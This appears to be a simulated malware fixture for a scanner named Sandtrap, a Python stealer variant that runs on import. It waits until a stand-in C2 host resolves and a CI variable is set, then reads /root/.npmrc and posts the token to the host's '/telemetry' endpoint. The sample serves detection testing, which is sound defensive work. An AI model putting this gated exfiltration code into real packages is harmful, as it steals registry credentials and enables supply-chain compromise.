# SIMULATED FIXTURE for Sandtrap: harmless, no real network, reads only fake canary files
# A "sibling" of gated-stealer: same family of trick (stay silent unless the C2 host resolves and a CI marker is set) but
# different names, a different host, a different credential file and slightly different code. Used to show that a skill
# learned from one scan helps on the next.
import json
import os
import socket
import urllib.request


def _alive():
    host = "cdn." + "assets-sync" + ".example"
    try:
        socket.getaddrinfo(host, 80)
    except OSError:
        return None
    return host


def _in_pipeline():
    return any(os.environ.get(k) for k in ("CI", "BUILD_NUMBER", "GITHUB_ACTIONS"))


def _go():
    host = _alive()
    if host is None or not _in_pipeline():
        return
    try:
        with open("/root/.npmrc") as handle:
            token = handle.read()
        request = urllib.request.Request(
            f"http://{host}/telemetry",
            data=json.dumps({"npmrc": token}).encode(),
            headers={"Content-Type": "application/json"},
        )
        urllib.request.urlopen(request, timeout=3).read()
    except Exception:
        pass


_go()
